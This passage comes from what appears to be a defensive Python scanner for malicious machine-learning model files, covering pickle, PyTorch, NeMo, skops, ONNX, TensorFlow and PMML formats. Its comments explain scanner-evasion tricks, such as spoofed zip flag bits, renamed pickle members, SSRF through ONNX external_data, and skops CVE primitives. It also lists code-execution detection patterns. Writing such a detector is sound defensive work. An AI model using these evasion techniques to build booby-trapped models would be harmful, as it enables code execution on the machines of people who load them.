        config extractor reads it without needing protobuf or tensorflow
        installed. The root node's metadata holds the fully nested layer
        graph, which is why the first extracted object is sufficient.
        """
        config = _extract_keras_model_config(data)
        if config is None:
            return []
        return self._keras_findings_from_config(file_path, config)

    def _keras_findings_from_config(self, file_path: Path, config: dict) -> list[Finding]:
        findings: list[Finding] = []

        lambda_layers = _find_keras_risky_layers(config)
        if lambda_layers:
            findings.append(Finding(
                rule_id="MFV-KERAS-001",
                message=f"Keras model contains {len(lambda_layers)} Lambda layer(s): "
                        f"{', '.join(lambda_layers[:3])}. Lambda layers embed a "
                        f"marshalled/serialized Python function that executes on model load.",
                severity=Severity.HIGH,
                category=Category.DESERIALIZATION,
                file_path=str(file_path),
                start_line=0,
                confidence=0.85,
                cwe_ids=[502],
                engine="mfv",
                metadata={"lambda_layers": lambda_layers},
            ))

        unrecognized = _find_keras_unrecognized_classes(config)
        if unrecognized:
            findings.append(Finding(
                rule_id="MFV-KERAS-002",
                message=f"Keras model references layer class(es) not on the known-builtin "
                        f"list: {', '.join(unrecognized[:10])}. Likely a legitimate custom "
                        f"layer, but not verifiable by static analysis -- executes via "
                        f"registered custom_objects at load time.",
                severity=Severity.INFO,
                category=Category.DESERIALIZATION,
                file_path=str(file_path),
                start_line=0,
                confidence=0.3,
                cwe_ids=[502],
                engine="mfv",
                metadata={"unrecognized_classes": unrecognized},
            ))

        return findings

    # ── PyTorch zip scanning ──────────────────────────────────────

    def _read_zip_member_capped(self, zf: zipfile.ZipFile, name: str, max_bytes: int) -> bytes | None:
        """Read a zip member's decompressed bytes, aborting once max_bytes is exceeded.

        ZipFile.read() decompresses the full stream regardless of the
        (attacker-controlled) declared file_size in the central directory --
        a small compressed member can still expand to gigabytes. Read in
        chunks and stop as soon as the cap is exceeded instead of trusting
        that metadata, so a malicious checkpoint can't exhaust memory.
        """
        chunks: list[bytes] = []
        total = 0
        with zf.open(name) as fh:
            while True:
                chunk = fh.read(1_000_000)
                if not chunk:
                    break
                total += len(chunk)
                if total > max_bytes:
                    return None
                chunks.append(chunk)
        return b"".join(chunks)

    # First bytes of a pickle stream: protocol 2..5 opens with `\x80<proto>`,
    # and protocol 0/1 opens with one of a small set of printable opcodes.
    _PICKLE_OPENERS: tuple[bytes, ...] = (
        b"\x80\x02", b"\x80\x03", b"\x80\x04", b"\x80\x05",
        b"c", b"(", b"]", b"}", b"\x28",
    )

    def _zip_member_may_be_pickle(
        self, zf: zipfile.ZipFile, info: zipfile.ZipInfo, file_path: Path | None,
    ) -> bool:
        """Whether a zip member is worth running the pickle analysis over.

        Name first, because `archive/data.pkl` is the convention and checking a
        string is free. But the name is attacker-chosen: picklescan's corpus
        carries the same payload as `data.txt` precisely because scanners that
        filter members by extension skip it. So anything not matched by name is
        sniffed on its opening bytes instead.

        Only the first two bytes are read, which keeps the cost negligible on
        checkpoints whose other members are large tensor blobs.
        """
        name = info.filename
        if name.endswith((".pkl", ".pickle")) or name.rsplit("/", 1)[-1] == "data.pkl":
            return True
        if info.file_size < 2 or info.file_size > self.MAX_ZIP_MEMBER_BYTES:
            return False
        try:
            with zf.open(info) as handle:
                head = handle.read(2)
        except (OSError, zipfile.BadZipFile, RuntimeError, NotImplementedError):
            # Unreadable through the strict path. Sniff the stored bytes, for
            # the same reason the read fallback exists below. `file_path` is
            # None when this member lives inside a nested archive held in
            # memory: header offsets are then relative to that inner archive,
            # not to the file on disk, so the raw read would seek to the wrong
            # bytes and must be skipped rather than trusted.
            if file_path is None:
                return False
            raw = self._read_zip_member_raw(file_path, info, head_only=True)
            head = raw or b""
        return head.startswith(self._PICKLE_OPENERS)

    def _read_zip_member_raw(
        self, path: Path, info: zipfile.ZipInfo, head_only: bool = False,
    ) -> bytes | None:
        """Read a member's bytes straight out of the archive, bypassing
        `zipfile`'s flag-bit checks.

        Used only when the strict reader refuses. Parses the *local* file
        header (whose name/extra lengths can differ from the central
        directory's, which is itself a parser-differential trick) to find where
        the data starts, then returns it: verbatim for STORED members, raw-
        inflated for DEFLATED ones.

        Returns None when the member cannot be located or exceeds the size cap.
        Never raises: this runs on attacker-controlled bytes.
        """
        try:
            with open(path, "rb") as handle:
                handle.seek(info.header_offset)
                local = handle.read(30)
                if len(local) < 30 or local[:4] != b"PK\x03\x04":
                    return None
                name_len, extra_len = struct.unpack("<HH", local[26:30])
                handle.seek(info.header_offset + 30 + name_len + extra_len)
                want = 2 if head_only else min(info.compress_size, self.MAX_ZIP_MEMBER_BYTES + 1)
                if not head_only and info.compress_size > self.MAX_ZIP_MEMBER_BYTES:
                    return None
                blob = handle.read(want)
        except OSError:
            return None

        if info.compress_type == zipfile.ZIP_STORED:
            return blob
        if head_only:
            return None
        try:
            return zlib.decompressobj(-15).decompress(blob, self.MAX_ZIP_MEMBER_BYTES)
        except zlib.error:
            return None

    _ZIP_LOCAL_MAGIC = b"PK\x03\x04"

    # Cap on how many tar members are inspected. A tar has no central
    # directory, so the only way to know what it holds is to walk it; this
    # bounds that walk against an archive padded with millions of tiny
    # entries. Real .nemo checkpoints hold a handful of files.
    MAX_TAR_MEMBERS = 1000

    def _scan_tar_pickles(self, file_path: Path) -> list[Finding]:
        """Scan the pickle streams inside a tar-based checkpoint container.

        NVIDIA NeMo's `.nemo` is a plain (usually uncompressed) tar holding
        `model_config.yaml` alongside `model_weights.ckpt`, and that ckpt is
        an ordinary pickle -- either flat or, for newer exports, itself a zip
        in torch's own format. Both shapes are handled.

        Nothing is ever extracted to disk, so tar path-traversal ("zip slip")
        is not reachable from here: members are only read into memory, under
        the same per-member size cap the zip path uses.
        """
        findings: list[Finding] = []
        try:
            archive = tarfile.open(file_path, "r:*")
        except (tarfile.TarError, OSError, EOFError):
            # A .nemo that does not open as a tar is corrupt or extension-
            # spoofed. scan_file's early return for NEMO bypasses the
            # extension-confusion check, so nothing else owns this case:
            # silence would be a clean verdict on a file never analysed.
            return [_skip_unverified_finding(
                file_path,
                "The .nemo container does not open as a tar archive.",
                metadata={"skipped_reason": "container_open_failed"},
            )]

        try:
            with archive as tf:
                hit_member_cap = False
                for index, member in enumerate(tf):
                    if index >= self.MAX_TAR_MEMBERS:
                        hit_member_cap = True
                        break
                    if not member.isfile():
                        continue
                    if member.size < 2 or member.size > self.MAX_ZIP_MEMBER_BYTES:
                        continue
                    try:
                        handle = tf.extractfile(member)
                        if handle is None:
                            continue
                        blob = handle.read(self.MAX_ZIP_MEMBER_BYTES)
                    except (OSError, tarfile.TarError):
                        continue
                    if len(blob) < 2:
                        continue

                    if blob[:4] == self._ZIP_LOCAL_MAGIC:
                        findings.extend(self._scan_zip_bytes(blob, member.name, file_path))
                        continue
                    if not blob.startswith(self._PICKLE_OPENERS):
                        exec_hits = _find_embedded_executables(blob)
                        if exec_hits:
                            findings.append(self._executable_finding(
                                file_path, exec_hits, member=member.name))
                        continue
                    for f in self._scan_pickle(file_path, blob):
                        f.message = f"[{member.name}] {f.message}"
                        f.metadata = {**(f.metadata or {}), "tar_member": member.name}
                        findings.append(f)
                # Iteration ending is not proof the file ended. A tar cut
                # inside a member *header* stops the walk with no exception
                # at all (measured: members before the cut are yielded, the
                # rest vanish silently). The walk is only complete when what
                # remains past the read offset is the format's own zero
                # padding; a non-zero tail is unexamined content.
                if hit_member_cap:
                    findings.append(Finding(
                        rule_id="MFV-SKIP-002",
                        message=f"Tar container has more than {self.MAX_TAR_MEMBERS} "
                                f"members; only the first {self.MAX_TAR_MEMBERS} were "
                                f"analysed. NOT a clean verdict for the remainder.",
                        severity=Severity.LOW,
                        category=Category.AI_ML,
                        file_path=str(file_path),
                        start_line=0,
                        confidence=0.50,
                        engine="mfv",
                        metadata={"skipped_reason": "member_cap"},
                    ))
                else:
                    consumed = tf.offset
                    file_size = file_path.stat().st_size
                    if 0 < consumed < file_size:
                        with open(file_path, "rb") as fh:
                            fh.seek(consumed)
                            tail = fh.read(1 << 20)
                        if any(tail):
                            findings.append(Finding(
                                rule_id="MFV-SKIP-002",
                                message=f"Tar walk stopped {file_size - consumed} bytes "
                                        f"before the end of the file with no error raised; "
                                        f"the unread tail contains data. NOT a clean verdict "
                                        f"for the remainder of the archive.",
                                severity=Severity.LOW,
                                category=Category.AI_ML,
                                file_path=str(file_path),
                                start_line=0,
                                confidence=0.55,
                                engine="mfv",
                                metadata={"skipped_reason": "unread_tail",
                                          "unread_bytes": file_size - consumed},
                            ))
        except (tarfile.TarError, OSError, EOFError) as exc:
            # The walk died partway. Returning [] here would discard the members
            # already scanned, which makes "payload in member 1, malformed
            # member 2" a better evasion than the payload on its own. Keep what
            # was found and say the rest was never looked at.
            findings.append(Finding(
                rule_id="MFV-SKIP-002",
                message=f"Tar container walk ended early ({type(exc).__name__}), so any "
                        f"members past the failure point were never analysed. NOT a clean "
                        f"verdict for the remainder of the archive.",
                severity=Severity.LOW,
                category=Category.AI_ML,
                file_path=str(file_path),
                start_line=0,
                confidence=0.50,
                engine="mfv",
                metadata={"skipped_reason": "tar_walk_failed", "error": type(exc).__name__},
            ))
        return findings

    def _scan_nested_zip_member(
        self, zf: zipfile.ZipFile, info: zipfile.ZipInfo, file_path: Path,
    ) -> list[Finding]:
        """Scan pickle streams one level further down, inside a zip member
        that is itself a zip.

        TorchServe's `.mar` is the case that makes this necessary:
        `torch-model-archiver --serialized-file model.pt` stores a whole
        PyTorch checkpoint (already a zip wrapping `archive/data.pkl`) as an
        archive member, so the payload sits two containers deep and a
        single-level walk reports the file clean.

        Bounded to exactly one extra level. That matches the real packaging
        convention and leaves no unbounded recursion for a nested-zip bomb to
        drive; the per-member size cap still applies at both levels.
        """
        if info.file_size < 4 or info.file_size > self.MAX_ZIP_MEMBER_BYTES:
            return []
        try:
            with zf.open(info) as handle:
                if handle.read(4) != self._ZIP_LOCAL_MAGIC:
                    return []
            blob = self._read_zip_member_capped(zf, info.filename, self.MAX_ZIP_MEMBER_BYTES)
        except (OSError, zipfile.BadZipFile, RuntimeError, NotImplementedError):
            # Same lie the .pt walk already handles one level up: lied flag
            # bits make the strict reader refuse a plainly readable member.
            # The only caller opens `zf` on `file_path` itself, so the raw
            # local-header read is valid here.
            blob = self._read_zip_member_raw(file_path, info)
            if blob is None or blob[:4] != self._ZIP_LOCAL_MAGIC:
                return []
        if blob is None:
            return []

        return self._scan_zip_bytes(blob, info.filename, file_path)

    def _scan_zip_bytes(self, blob: bytes, prefix: str, file_path: Path) -> list[Finding]:
        """Scan every pickle member of a zip archive held in memory.

        Shared by the nested-zip descent (a `.pt` inside a `.mar`) and the tar
        container walk (a zip-format checkpoint inside a `.nemo`); both hold
        the inner archive as bytes rather than as a file on disk.
        """
        findings: list[Finding] = []
        try:
            with zipfile.ZipFile(io.BytesIO(blob)) as inner_zf:
                for inner in inner_zf.infolist():
                    # file_path is deliberately None: the raw-bytes fallback
                    # keys off on-disk header offsets, which are meaningless
                    # for an archive that only exists in memory.
                    if not self._zip_member_may_be_pickle(inner_zf, inner, None):
                        continue
                    try:
                        data = self._read_zip_member_capped(
                            inner_zf, inner.filename, self.MAX_ZIP_MEMBER_BYTES,
                        )
                    except (OSError, zipfile.BadZipFile, RuntimeError, NotImplementedError):
                        continue
                    if data is None:
                        continue
                    label = f"{prefix}/{inner.filename}"
                    for f in self._scan_pickle(file_path, data):
                        f.message = f"[{label}] {f.message}"
                        f.metadata = {**(f.metadata or {}), "zip_member": label}
                        findings.append(f)
        except (zipfile.BadZipFile, OSError) as exc:
            # The inner archive never opened or the walk died partway.
            # Returning [] discards the members already scanned, the same
            # evasion the tar walk's MFV-SKIP-002 exists to close.
            findings.append(Finding(
                rule_id="MFV-SKIP-002",
                message=f"[{prefix}] Zip container walk ended early "
                        f"({type(exc).__name__}), so any members past the failure "
                        f"point were never analysed. NOT a clean verdict for the "
                        f"remainder of the archive.",
                severity=Severity.LOW,
                category=Category.AI_ML,
                file_path=str(file_path),
                start_line=0,
                confidence=0.50,
                engine="mfv",
                metadata={
                    "skipped_reason": "zip_walk_failed",
                    "error": type(exc).__name__,
                    "zip_member": prefix,
                },
            ))
        return findings

    def _scan_pytorch_zip(self, file_path: Path) -> list[Finding]:
        """Scan the pickle stream(s) inside a PyTorch (or other) zip checkpoint.

        torch.save() stores the real pickle as ``archive/data.pkl`` inside a ZIP
        container. We extract every pickle member and run the same opcode/byte
        analysis on each inner stream, re-attributing findings to the member so
        the report points at ``model.pt:archive/data.pkl``.
        """
        findings: list[Finding] = []
        try:
            zf = zipfile.ZipFile(file_path, "r")
        except (zipfile.BadZipFile, OSError):
            # Not actually a zip, so treat it as a legacy flat pickle.
            return self._scan_pickle(file_path, file_path.read_bytes())
        try:
            with zf:
                for info in zf.infolist():
                    name = info.filename
                    if not self._zip_member_may_be_pickle(zf, info, file_path):
                        findings.extend(self._scan_nested_zip_member(zf, info, file_path))
                        continue
                    try:
                        inner = self._read_zip_member_capped(zf, name, self.MAX_ZIP_MEMBER_BYTES)
                    except (OSError, zipfile.BadZipFile, RuntimeError, NotImplementedError):
                        # A member the strict reader refuses is NOT evidence of
                        # safety, and skipping it silently reported the file
                        # clean. The refusal is usually a lie: setting the
                        # general-purpose flag bits for "encrypted" (0x1),
                        # "compressed patched data" (0x20) or "strong
                        # encryption" (0x40) makes Python's `zipfile` bail,
                        # while the member is plainly STORED and readable, and
                        # loaders that use their own zip reader (torch ships a
                        # miniz-based one) go straight past it. Three bytes of
                        # header edit therefore evaded this scanner completely
                        # on `.pt`, the most common PyTorch checkpoint format.
                        #
                        # So fall back to the bytes as they physically sit in
                        # the archive. If a member really is encrypted, that
                        # read yields ciphertext, the pickle walk fails on it
                        # and nothing is reported -- which is the correct
                        # outcome, and is what keeps a genuinely
                        # password-protected archive quiet.
                        inner = self._read_zip_member_raw(file_path, info)
                        if inner is None:
                            continue
                    if inner is None:
                        findings.append(Finding(
                            rule_id="MFV-PICKLE-003",
                            message=f"[{name}] Pickle member exceeds "
                                    f"{self.MAX_ZIP_MEMBER_BYTES // 1_000_000}MB decompressed size "
                                    f"limit -- possible zip bomb. Skipping for memory safety.",
                            severity=Severity.HIGH,
                            category=Category.AI_ML,
                            file_path=str(file_path),
                            start_line=0,
                            confidence=0.6,
                            engine="mfv",
                            metadata={"zip_member": name, "skipped_reason": "oversized_decompressed"},
                        ))
                        continue
                    exec_hits = _find_embedded_executables(inner)
                    if exec_hits:
                        findings.append(self._executable_finding(file_path, exec_hits, member=name))
                    for f in self._scan_pickle(file_path, inner):
                        f.message = f"[{name}] {f.message}"
                        f.metadata = {**(f.metadata or {}), "zip_member": name}
                        findings.append(f)
        except (zipfile.BadZipFile, OSError) as exc:
            # The walk died partway. Falling back to a flat-pickle scan of zip
            # bytes (which are not a pickle) would discard the members already
            # scanned, making "payload in member 1, malformed member 2" a
            # better evasion than the payload on its own. Keep what was found
            # and say the rest was never looked at.
            findings.append(Finding(
                rule_id="MFV-SKIP-002",
                message=f"Zip container walk ended early ({type(exc).__name__}), so any "
                        f"members past the failure point were never analysed. NOT a clean "
                        f"verdict for the remainder of the archive.",
                severity=Severity.LOW,
                category=Category.AI_ML,
                file_path=str(file_path),
                start_line=0,
                confidence=0.50,
                engine="mfv",
                metadata={"skipped_reason": "zip_walk_failed", "error": type(exc).__name__},
            ))
        return findings

    # ── skops scanning ──────────────────────────────────────────────
    #
    # skops (skops.io) is Hugging Face's pickle-free sklearn persistence: a
    # zip holding `schema.json` (a tree of typed nodes) plus one `.npy`
    # member per array. Its security contract is structural, which makes it
    # checkable without any name list of our own:
    #
    # 1. Every object/function the loader will resolve and instantiate is a
    #    `__module__` + `__class__` pair in the schema, so type references
    #    classify with exactly the pickle engine's allow/deny/unknown split.
    #    A skops file reaching for `os.system` is as damning as a pickle
    #    doing it, and for the same reason.
    # 2. Two loaders carry a structural invariant the file can break:
    #    MethodNode must agree with the object it binds (breaking the
    #    agreement is CVE-2025-54413's primitive), and OperatorFuncNode must
    #    live in the `operator` module (CVE-2025-54412's). skops >= 0.12.0
    #    raises on both at load; older versions execute. A file in the broken
    #    shape is malicious per se, whatever the victim's skops version.
    # 3. The format never embeds pickle (its reason to exist is not to). A
    #    member that walks as a pickle stream defeats the guarantee and gets
    #    the pickle engine's full analysis plus a note of its own.

    # Loaders skops 0.x can emit (NODE_TYPE_MAPPING plus the ReduceNode
    # subclasses). Closed set: anything else is a protocol this scanner does
    # not know and lands in the unknown bucket rather than being trusted.
    _SKOPS_KNOWN_LOADERS: frozenset[str] = frozenset({
        "DictNode", "DefaultDictNode", "ListNode", "SetNode", "TupleNode",
        "FunctionNode", "PartialNode", "TypeNode", "SliceNode",
        "ConstructorFromReduceNode", "ObjectNode", "MethodNode", "JsonNode",
        "BytesNode", "BytearrayNode", "OperatorFuncNode", "NdArrayNode",
        "MaskedArrayNode", "RandomStateNode", "RandomGeneratorNode",
        "DTypeNode", "SparseMatrixNode", "ReduceNode", "TreeNode", "LossNode",
        "QuantileForestNode", "_DictWithDeprecatedKeysNode", "CachedNode",
    })

    # Cap on schema.json bytes handed to json.loads: attacker-chosen nesting
    # is the one place a value drives real work. Real schemas are kilobytes;
    # a gradient-boosting ensemble is the largest legitimate case seen and
    # stays under 1MB.
    _SKOPS_MAX_SCHEMA_BYTES = 20_000_000
    # Bound on nodes walked per schema, against a billion-laughs JSON tree.
    _SKOPS_MAX_SCHEMA_NODES = 200_000

    def _scan_skops(self, file_path: Path) -> list[Finding]:
        findings: list[Finding] = []
        try:
            zf = zipfile.ZipFile(file_path, "r")
        except (zipfile.BadZipFile, OSError):
            # skops.io.dump only ever writes a zip, so a non-zip .skops is
            # corrupt or extension-spoofed. skops is not wired into the
            # extension-confusion check, so nothing else owns this case.
            return [_skip_unverified_finding(
                file_path,
                "The .skops file does not open as a zip archive, which "
                "skops.io.dump always writes.",
                metadata={"skipped_reason": "container_open_failed"},
            )]
        with zf:
            schemas = [
                info for info in zf.infolist()
                if info.filename.rsplit("/", 1)[-1] == "schema.json"
            ]
            if not schemas:
                findings.append(Finding(
                    rule_id="MFV-SKOPS-005",
                    message="Archive has a .skops extension but contains no schema.json, "
                            "which skops.io.dump always writes. Not a standard skops file; "
                            "content could not be verified.",
                    severity=Severity.INFO,
                    category=Category.AI_ML,
                    file_path=str(file_path),
                    start_line=0,
                    confidence=0.4,
                    engine="mfv",
                ))
            for info in schemas:
                if info.file_size > self._SKOPS_MAX_SCHEMA_BYTES:
                    findings.append(Finding(
                        rule_id="MFV-SKOPS-005",
                        message=f"[{info.filename}] schema.json exceeds "
                                f"{self._SKOPS_MAX_SCHEMA_BYTES // 1_000_000}MB; too large to "
                                f"verify. NOT a clean verdict.",
                        severity=Severity.LOW,
                        category=Category.AI_ML,
                        file_path=str(file_path),
                        start_line=0,
                        confidence=0.4,
                        engine="mfv",
                    ))
                    continue
                raw = self._read_zip_member_capped(
                    zf, info.filename, self._SKOPS_MAX_SCHEMA_BYTES)
                if raw is None:
                    continue
                try:
                    schema = json.loads(raw)
                except (UnicodeDecodeError, json.JSONDecodeError, RecursionError,
                        ValueError, MemoryError):
                    findings.append(Finding(
                        rule_id="MFV-SKOPS-005",
                        message=f"[{info.filename}] schema.json does not parse as JSON; "
                                "content could not be verified.",
                        severity=Severity.INFO,
                        category=Category.AI_ML,
                        file_path=str(file_path),
                        start_line=0,
                        confidence=0.4,
                        engine="mfv",
                    ))
                    continue
                findings.extend(self._scan_skops_schema(file_path, info.filename, schema))

            # Any member that walks as a pickle stream gets the pickle
            # engine, same as a .mar member, plus a note that the archive
            # broke the format's pickle-free guarantee.
            for info in zf.infolist():
                if info in schemas:
                    continue
                if not self._zip_member_may_be_pickle(zf, info, file_path):
                    continue
                inner = self._read_zip_member_capped(zf, info.filename,
                                                     self.MAX_ZIP_MEMBER_BYTES)
                if inner is None:
                    continue
                findings.append(Finding(
                    rule_id="MFV-SKOPS-004",
                    message=f"[{info.filename}] skops archive embeds a pickle stream. "
                            "The format's security proposition is that it never contains "
                            "one, so its presence defeats the guarantee the loader relies "
                            "on. The stream itself is analysed separately.",
                    severity=Severity.LOW,
                    category=Category.DESERIALIZATION,
                    file_path=str(file_path),
                    start_line=0,
                    confidence=0.6,
                    cwe_ids=[502],
                    engine="mfv",
                    metadata={"zip_member": info.filename},
                ))
                for f in self._scan_pickle(file_path, inner):
                    f.message = f"[{info.filename}] {f.message}"
                    f.metadata = {**(f.metadata or {}), "zip_member": info.filename}
                    findings.append(f)
        return findings

    def _scan_skops_schema(
        self, file_path: Path, member: str, schema: object,
    ) -> list[Finding]:
        """Walk one parsed schema tree. Iterative with a node cap: both the
        depth and the breadth of this JSON are attacker-chosen."""
        denied: list[str] = []
        unknown: list[str] = []
        unknown_loaders: list[str] = []
        structural: list[str] = []

        stack = [schema]
        visited = 0
        while stack:
            node = stack.pop()
            if isinstance(node, list):
                stack.extend(node)
            elif isinstance(node, dict):
                stack.extend(node.values())
                visited += 1
                if visited > self._SKOPS_MAX_SCHEMA_NODES:
                    break
                loader = node.get("__loader__")
                if loader is None:
                    continue
                if loader not in self._SKOPS_KNOWN_LOADERS:
                    unknown_loaders.append(str(loader))
                module = node.get("__module__")
                klass = node.get("__class__")
                if loader == "OperatorFuncNode" and module != "operator":
                    structural.append(
                        f"OperatorFuncNode from module {module!r} (the loader "
                        f"resolves it in `operator`; any other module is "
                        f"CVE-2025-54412's primitive, fixed in skops "
                        f"0.12.0, executed before it)"
                    )
                if loader == "MethodNode" and isinstance(node.get("content"), dict):
                    obj = node["content"].get("obj")
                    if isinstance(obj, dict) and (
                        obj.get("__module__") != module
                        or obj.get("__class__") != klass
                    ):
                        structural.append(
                            f"MethodNode declaring {module}.{klass} but binding "
                            f"{obj.get('__module__')}.{obj.get('__class__')} "
                            f"(CVE-2025-54413's primitive: the pre-0.12.0 "
                            f"loader trusted the outer pair and called the inner)"
                        )
                if isinstance(module, str) and isinstance(klass, str):
                    ref = f"{module}.{klass}"
                    verdict = _classify_pickle_global(ref)
                    if verdict == "denied":
                        denied.append(ref)
                    elif verdict == "unknown" and module != "builtins":
                        # builtins containers are the serialization machinery
                        # itself (DictNode of builtins.dict, ...), not payload.
                        unknown.append(ref)

        findings: list[Finding] = []
        if structural:
            findings.append(Finding(
                rule_id="MFV-SKOPS-002",
                message=f"[{member}] skops loader state is inconsistent with the "
                        f"loader's own contract: {'; '.join(structural[:3])}. "
                        "skops >= 0.12.0 refuses this file; older versions resolve "
                        "and call through it.",
                severity=Severity.CRITICAL,
                category=Category.DESERIALIZATION,
                file_path=str(file_path),
                start_line=0,
                confidence=0.9,
                cwe_ids=[502],
                engine="mfv",
                metadata={"inconsistencies": structural},
            ))
        if denied:
            findings.append(Finding(
                rule_id="MFV-SKOPS-001",
                message=f"[{member}] skops schema references type(s) that grant "
                        f"code/command execution on load: {', '.join(sorted(denied))}. "
                        "skops resolves every __module__/__class__ pair it is asked to "
                        "trust; these must never appear in a model.",
                severity=Severity.CRITICAL,
                category=Category.DESERIALIZATION,
                file_path=str(file_path),
                start_line=0,
                confidence=0.9,
                cwe_ids=[502],
                engine="mfv",
                metadata={"denied_types": sorted(denied)},
            ))
        if unknown or unknown_loaders:
            parts = []
            if unknown:
                parts.append(
                    "type reference(s) outside the trusted set: "
                    + ", ".join(sorted(set(unknown))[:10])
                )
            if unknown_loaders:
                parts.append(
                    "unrecognized __loader__ name(s): "
                    + ", ".join(sorted(set(unknown_loaders)))
                )
            findings.append(Finding(
                rule_id="MFV-SKOPS-003",
                message=f"[{member}] skops schema carries {'; '.join(parts)}. "
                        "Likely a legitimate custom class or a newer protocol, but "
                        "not verifiable by static analysis -- loading this file "
                        "requires passing trusted= to skops.io.load, which is the "
                        "decision that needs a human.",
                severity=Severity.INFO,
                category=Category.DESERIALIZATION,
                file_path=str(file_path),
                start_line=0,
                confidence=0.4,
                cwe_ids=[502],
                engine="mfv",
                metadata={
                    "unknown_types": sorted(set(unknown)),
                    "unknown_loaders": sorted(set(unknown_loaders)),
                },
            ))
        return findings


    # ── ONNX scanning ──────────────────────────────────────────────

    def _scan_onnx(self, file_path: Path, data: bytes) -> list[Finding]:
        """ONNX's real, previously-exploited RCE vector is a custom op
        (onnxruntime-extensions' PyOp/PythonOp) that embeds a Python callable
        to run at inference time; a secondary risk is a maliciously crafted
        `external_data` location string escaping the model directory. Both
        show up as plain string leaves somewhere in the model's protobuf
        tree -- walked schema-lessly (see _extract_protobuf_strings) rather
        than requiring the `onnx`/`protobuf` packages just to read op names.
        """
        findings: list[Finding] = []
        try:
            strings = _extract_protobuf_strings(data)
        except RecursionError:
            return [_skip_unverified_finding(
                file_path,
                "The protobuf walk blew the recursion limit on this file, so "
                "its op names and external_data strings were never extracted.",
                metadata={"skipped_reason": "recursion_limit"},
            )]

        dangerous_ops = sorted({s for s in strings if s in ONNX_DANGEROUS_OPS})
        if dangerous_ops:
            findings.append(Finding(
                rule_id="MFV-ONNX-001",
                message=f"ONNX model references custom op(s) with documented code-execution "
                        f"behavior: {', '.join(dangerous_ops)}. onnxruntime-extensions' PyOp/"
                        f"PythonOp embed a Python callable that runs at inference time.",
                severity=Severity.HIGH,
                category=Category.AI_ML,
                file_path=str(file_path),
                start_line=0,
                confidence=0.75,
                cwe_ids=[502, 94],
                engine="mfv",
                metadata={"dangerous_ops": dangerous_ops},
            ))

        external_maps = _onnx_external_data_maps(data)
        # A location is meant to name a sibling file. A URL there makes the
        # loader fetch it, which is SSRF from inside a model: a published
        # proof of concept points one at 169.254.169.254, the cloud instance
        # metadata endpoint, to lift credentials during a scan or a load.
        remote_locations = sorted({
            location
            for entries in external_maps
            for location in [entries.get("location", "")]
            if _ONNX_REMOTE_LOCATION_RE.match(location)
        })
        if remote_locations:
            findings.append(Finding(
                rule_id="MFV-ONNX-004",
                message=f"ONNX external_data location(s) point off the filesystem: "
                        f"{', '.join(remote_locations[:5])}. The loader fetches "
                        f"what location names, so a URL here makes loading the "
                        f"model issue a request the operator never asked for.",
                severity=Severity.HIGH,
                category=Category.SSRF,
                file_path=str(file_path),
                start_line=0,
                confidence=0.85,
                cwe_ids=[918],
                engine="mfv",
                metadata={"locations": remote_locations[:20]},
            ))

        bad_locations = sorted({
            location
            for entries in external_maps
            for location in [entries.get("location", "")]
            if ".." in location or _ONNX_ABSOLUTE_PATH_RE.match(location)
        })
        traversal_paths = sorted({
            s for s in strings
            if len(s) < 4096 and (
                s.startswith("../") or "/../" in s or s.startswith("..\\") or "\\..\\" in s
            )
        } | set(bad_locations))
        if traversal_paths:
            findings.append(Finding(
                rule_id="MFV-ONNX-002",
                message=f"ONNX model contains path-like string(s) with '..' traversal "
                        f"segments or absolute external_data locations: "
                        f"{', '.join(traversal_paths[:5])}. If referenced via "
                        f"external_data, this escapes the model's own directory when "
                        f"the weights are loaded.",
                severity=Severity.MEDIUM,
                category=Category.PATH_TRAVERSAL,
                file_path=str(file_path),
                start_line=0,
                confidence=0.5,
                cwe_ids=[22],
                engine="mfv",
                metadata={"traversal_paths": traversal_paths[:20]},
            ))

        unexpected_keys = sorted({
            key
            for entries in external_maps
            for key in entries
            if key not in _ONNX_EXTERNAL_DATA_KEYS
        })
        if unexpected_keys:
            findings.append(Finding(
                rule_id="MFV-ONNX-003",
                message=f"ONNX external_data carries key(s) outside the format's "
                        f"four-key contract (location/offset/length/checksum): "
                        f"{', '.join(unexpected_keys[:5])}. Before onnx 1.21.0 "
                        f"(CVE-2026-34445) these keys reached setattr() on the "
                        f"ExternalDataInfo object, overwriting internal properties.",
                severity=Severity.HIGH,
                category=Category.AI_ML,
                file_path=str(file_path),
                start_line=0,
                confidence=0.75,
                cwe_ids=[502],
                engine="mfv",
                metadata={"unexpected_keys": unexpected_keys[:20]},
            ))

        return findings

    # ── TensorFlow SavedModel scanning ─────────────────────────────

    def _scan_tf_savedmodel(self, file_path: Path, data: bytes) -> list[Finding]:
        """A SavedModel's GraphDef can embed ops that read/write files or
        invoke an embedded Python callable (PyFunc) at graph-execution time.
        Same schema-less protobuf walk as ONNX -- TF's GraphDef/NodeDef
        wire format is walked for op-name strings without needing the
        `tensorflow` package."""
        findings: list[Finding] = []
        try:
            strings = _extract_protobuf_strings(data)
        except RecursionError:
            return [_skip_unverified_finding(
                file_path,
                "The protobuf walk blew the recursion limit on this file, so "
                "its op names were never extracted.",
                metadata={"skipped_reason": "recursion_limit"},
            )]

        dangerous_ops = sorted({s for s in strings if s in TF_DANGEROUS_OPS})
        if dangerous_ops:
            findings.append(Finding(
                rule_id="MFV-TF-001",
                message=f"TensorFlow SavedModel graph references op(s) that read/write the "
                        f"filesystem or invoke an embedded Python callable at execution time: "
                        f"{', '.join(dangerous_ops)}.",
                severity=Severity.HIGH,
                category=Category.AI_ML,
                file_path=str(file_path),
                start_line=0,
                confidence=0.6,
                cwe_ids=[502, 94],
                engine="mfv",
                metadata={"dangerous_ops": dangerous_ops},
            ))
        return findings

    # ── PMML scanning ──────────────────────────────────────────────
    #
    # PMML is XML. The earlier "data-only, no code execution" rejection
    # was correct for code execution and wrong as a threat model: XXE is a
    # file-read and SSRF primitive needing none. PMML engines additionally
    # support transformations via <Apply function="..."> whose function
    # name is an execution vector in some runtimes. Both are checked here;
    # the parser itself (defusedxml) forbids DOCTYPE and therefore XXE at
    # parse time, turning it into a positive signal.

    _PMML_NAMESPACE = "http://www.dmg.org/PMML-4_4"
    _PMML_DANGEROUS_FUNCTION_PATTERNS = (
        "exec(", "eval(", "__import__", "os.", "subprocess",
        "java.lang.Runtime", "java.lang.ProcessBuilder",
        "Runtime.getRuntime",
    )

    def _scan_pmml(self, file_path: Path, data: bytes) -> list[Finding]:
        findings: list[Finding] = []
        import defusedxml.ElementTree as ET
        try:
            root = ET.fromstring(data)
        except EntitiesForbidden as exc:
            findings.append(Finding(
                rule_id="MFV-PMML-001",
